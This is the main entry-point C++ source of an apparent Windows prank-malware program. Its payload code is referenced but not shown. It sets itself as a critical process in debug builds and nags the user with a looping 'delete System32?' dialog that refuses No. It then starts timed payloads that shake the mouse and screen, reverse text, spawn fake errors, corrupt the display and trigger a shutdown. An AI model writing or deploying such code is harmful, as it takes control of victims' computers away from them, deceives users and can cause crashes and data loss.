#include "NtProcess.h"
#include "Payloads.h"

#include <windows.h>
#include <thread>

#include <mmsystem.h>
#pragma comment(lib, "winmm.lib")

#include <iostream>
#include <wingdi.h>
#include <windowsx.h>




int APIENTRY wWinMain(_In_ HINSTANCE hInstance,_In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine,_In_ int nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

#if DEBUG
    if (!NtProcess::SetCritical()) return 1;
#endif


    ask:
    int response = MessageBoxA(NULL, "Do you want to delete System32 ?             ", "Important question", MB_ICONQUESTION | MB_YESNO);
    if (response == IDYES) {
        MessageBoxA(NULL, "Deleting...            ", "Deleting System32", MB_ICONWARNING | MB_OK);
    }
    else {
        MessageBoxA(NULL, "I don't care            ", "Bruh", MB_ICONWARNING | MB_OK);
        goto ask;
    }


    std::thread MouseShake(Payloads::MouseShake);
    Sleep(5000);
    std::thread ScreenShake(Payloads::ScreenShake);
    Sleep(5000);
    std::thread ReverseText(Payloads::ReverseText);
    Sleep(5000);
    std::thread RandomErrors(Payloads::RandomErrors);
    Sleep(5000);
    Payloads::ScreenShakeStop = true;
    std::thread DisplayArtifacts(Payloads::DisplayArtifacts);
    Sleep(5000);
    std::thread DisplayBugs(Payloads::DisplayBugs);  
    Sleep(10000);
    Payloads::Shutdown = true;
    Sleep(1000);


    return 0;
}